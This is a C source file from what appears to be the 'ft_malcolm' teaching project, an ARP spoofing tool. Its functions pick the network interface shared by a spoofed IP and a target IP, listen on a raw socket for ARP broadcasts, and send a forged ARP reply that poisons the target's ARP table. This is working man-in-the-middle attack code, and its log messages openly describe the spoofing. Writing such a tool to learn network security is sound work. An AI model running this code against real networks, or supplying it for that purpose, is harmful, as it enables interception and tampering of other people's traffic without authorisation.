#include "ft_malcolm.h"

void	resolve_hostname_from_ip(char *dest, unsigned char *ip_addr)
{
	struct in_addr addr;
    struct hostent *host;

    char ip_str[INET_ADDRSTRLEN];
    if (!inet_ntop(AF_INET, ip_addr, ip_str, INET_ADDRSTRLEN)) {
        log_error("Error: resolving hostname.");
        log_error(strerror(errno));
        return;
    }

	if (!inet_pton(AF_INET, ip_str, &addr)) {
        log_error("Hostname not resolved: invalid IP address format");
        return ;
    }

    host = gethostbyaddr(&addr, sizeof(addr), AF_INET);
    if (!host) {
        log_error("Error: resolving host by address.");
        log_error(hstrerror(h_errno));
        return ;
    }
	ft_memcpy(dest, host->h_name, HOST_NAME_MAX);
}

static int    get_interface_name(struct ifaddrs *ifap ,char *ifname, t_malcolm  *data)
{
    struct ifaddrs  *ifa;
    int ret = 1;

    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr && !ft_strcmp(ifname, ifa->ifa_name) && ifa->ifa_addr->sa_family == AF_PACKET) {
            struct sockaddr_ll *s = (struct sockaddr_ll*)ifa->ifa_addr;
            if (s->sll_hatype == ARPHRD_LOOPBACK)
            {
                continue;
            }
            if (s->sll_halen == ETH_ALEN) {
                log_msg("Found available interface:", ifa->ifa_name);
                ft_memcpy(data->ifname, ifa->ifa_name, sizeof(ifa->ifa_name));
                ret = 0;
                break;
            }
        }
    }
    return (ret);
}

int get_interface(t_malcolm  *data)
{
    struct ifaddrs *ifap, *ifa, *tmp;
    uint32_t netip_src;
    uint32_t netip_dst;
    int ret = 1;

    ft_memcpy(&netip_src, data->spoofed_ip, sizeof(netip_src));
    ft_memcpy(&netip_dst, data->target_ip, sizeof(netip_dst));
    getifaddrs (&ifap);
    if (!ifap) {
        return (1);
    }
    tmp = ifap;
    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) {
            uint32_t netip = ((struct sockaddr_in *)ifa->ifa_addr)->sin_addr.s_addr;
            uint32_t netmask = ((struct sockaddr_in *)ifa->ifa_netmask)->sin_addr.s_addr;
            uint32_t netstart = (netip & netmask);
            uint32_t netend = (netstart | ~netmask);
            if ((netip_src >= netstart) && (netip_src <= netend) && (netip_dst >= netstart) && (netip_dst <= netend))
            {
                ret = get_interface_name(tmp, ifa->ifa_name, data);
                if (!ret)
                {
                    data->ifindex = if_nametoindex(data->ifname);
                    break;
                }
            }
        }
    }
    freeifaddrs(ifap);
    return (ret);
}

int listen_to_broadcast(t_malcolm *data)
{
    unsigned char buffer[sizeof(struct ethhdr) + sizeof(struct arppckt)];
    ssize_t packet_size;
    struct sockaddr_ll recv_addr;
    socklen_t addr_len = sizeof(recv_addr);
    while (!g_exit_code) {
        packet_size = recvfrom(data->sock_fd, &buffer, sizeof(buffer), 0, (struct sockaddr *)&recv_addr, &addr_len);
        if (packet_size < 0)
        {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                log_msg("ft_malcolm:", "received timeout...");
                continue;
            }
            log_error(strerror(errno));
            if (errno == EINTR)
                break;
            return (1);
        }
        if (data->sockaddr_target.sll_ifindex != recv_addr.sll_ifindex)
            continue ;
        if (!process_packet(buffer, data))
            break ;
    }
    return (g_exit_code);
}

int send_reply(t_malcolm *data)
{
    unsigned char buffer[MIN_ETHERNET_FRAME_SIZE];

    ft_memset(buffer, 0, sizeof(buffer));
    create_reply_packet(buffer, data);
    struct arppckt *arp_packet = (struct arppckt *)(buffer + sizeof(struct ethhdr));
    
    if (ntohs(arp_packet->ar_pro) != ETH_P_IP || ntohs(arp_packet->ar_hrd) != ARPHRD_ETHER)
        return (1);
    log_msg("Now sending an ARP reply to the target address with spoofed source, please wait...", NULL);
    if (data->hostname)
    {
        char sender_hostname[HOST_NAME_MAX];
        char target_hostname[HOST_NAME_MAX];
        resolve_hostname_from_ip(sender_hostname, arp_packet->ar_sip);
        resolve_hostname_from_ip(target_hostname, arp_packet->ar_tip);
        fprintf(stdout, " sender hostname: %s\n", sender_hostname);
        fprintf(stdout, " target hostname: %s\n", target_hostname);
    }
    if (data->verbose)
        log_packet(buffer);
    sleep(1);
    if (sendto(data->sock_fd, &buffer, sizeof(buffer), 0, (struct sockaddr*)&(data)->sockaddr_target, sizeof(data->sockaddr_target)) < 0)
	{
	    log_error("sendto: failed");
        close(data->sock_fd);
		return (1);
	}
    close(data->sock_fd);
    log_msg("Sent an ARP reply packet, you may now check the arp table on the target.", NULL);
    log_msg("Exiting program...", NULL);
    return (0);
}
